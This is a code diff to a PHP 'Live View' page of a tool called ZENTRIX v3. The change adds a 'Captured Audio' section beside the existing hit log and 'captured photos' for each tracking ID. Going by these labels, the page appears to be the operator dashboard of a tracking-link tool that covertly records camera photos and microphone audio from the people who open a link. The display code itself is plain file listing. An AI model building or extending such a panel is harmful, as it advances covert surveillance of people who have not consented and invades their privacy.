@@ -1,7 +1,7 @@
 <?php
 /**
  * ZENTRIX v3 – Live View
- * Shows hits + captured photos for a specific tracking ID
+ * Shows hits + captured photos + audio for a specific tracking ID
  */
 
 $config = require __DIR__ . '/config.php';
@@ -23,13 +23,22 @@ if (file_exists($logFile)) {
 $logs = array_reverse($logs);
 $total = count($logs);
 
-// Find photos for this ID
+// Find photos
 $photoDir = __DIR__ . '/logs/photos';
 $photos = [];
 if (is_dir($photoDir)) {
     $files = glob($photoDir . '/' . $id . '_*.jpg');
-    rsort($files); // newest first
+    rsort($files);
     $photos = $files;
+}
+
+// Find audio files
+$audioDir = __DIR__ . '/logs/audio';
+$audios = [];
+if (is_dir($audioDir)) {
+    $files = glob($audioDir . '/' . $id . '_*.{webm,ogg,mp3,wav}', GLOB_BRACE);
+    rsort($files);
+    $audios = $files;
 }
 ?>
 <!DOCTYPE html>
@@ -83,6 +92,30 @@ if (is_dir($photoDir)) {
             justify-content: space-between;
             align-items: center;
         }
+        .audio-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 16px;
+        }
+        .audio-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .audio-item audio {
+            flex: 1;
+            height: 36px;
+        }
+        .audio-meta {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            min-width: 140px;
+        }
     </style>
 </head>
 <body>
@@ -107,7 +140,8 @@ if (is_dir($photoDir)) {
             </h1>
             <p style="color: var(--text-muted);">
                 <?= $total ?> hit<?= $total !== 1 ? 's' : '' ?> · 
-                <?= count($photos) ?> photo<?= count($photos) !== 1 ? 's' : '' ?>
+                <?= count($photos) ?> photo<?= count($photos) !== 1 ? 's' : '' ?> · 
+                <?= count($audios) ?> audio<?= count($audios) !== 1 ? 's' : '' ?>
             </p>
         </div>
 
@@ -119,7 +153,6 @@ if (is_dir($photoDir)) {
             <div class="photo-grid">
                 <?php foreach ($photos as $photo): 
                     $basename = basename($photo);
-                    // Extract timestamp from filename: id_timestamp.jpg
                     $parts = explode('_', $basename);
                     $ts = isset($parts[1]) ? str_replace('.jpg', '', $parts[1]) : '';
                     $timeStr = $ts ? date('Y-m-d H:i:s', (int)$ts) : '';
@@ -132,6 +165,32 @@ if (is_dir($photoDir)) {
                         <?php if ($timeStr): ?>
                             <div class="photo-time"><?= htmlspecialchars($timeStr) ?></div>
                         <?php endif; ?>
+                    </div>
+                <?php endforeach; ?>
+            </div>
+        <?php endif; ?>
+
+        <!-- Audio Section -->
+        <?php if (!empty($audios)): ?>
+            <div class="section-title">
+                <span>Captured Audio</span>
+            </div>
+            <div class="audio-list">
+                <?php foreach ($audios as $audio): 
+                    $basename = basename($audio);
+                    $parts = explode('_', $basename);
+                    $ts = isset($parts[1]) ? preg_replace('/\.(webm|ogg|mp3|wav)$/', '', $parts[1]) : '';
+                    $timeStr = $ts ? date('Y-m-d H:i:s', (int)$ts) : '';
+                    $webPath = 'logs/audio/' . $basename;
+                ?>
+                    <div class="audio-item">
+                        <div class="audio-meta">
+                            <?= htmlspecialchars($timeStr ?: $basename) ?>
+                        </div>
+                        <audio controls preload="metadata">
+                            <source src="<?= htmlspecialchars($webPath) ?>" type="audio/webm">
+                            Your browser does not support the audio element.
+                        </audio>
                     </div>
                 <?php endforeach; ?>
             </div>
